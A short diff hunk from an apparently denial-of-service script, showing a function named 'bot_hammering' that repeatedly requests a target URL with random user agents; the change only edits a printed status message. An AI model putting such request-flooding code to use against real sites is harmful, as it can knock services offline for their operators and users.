@@ -36,7 +36,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94m4N4M Bucin in Target...\033[0m")
+			print("\033[94mWaiting Jones...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
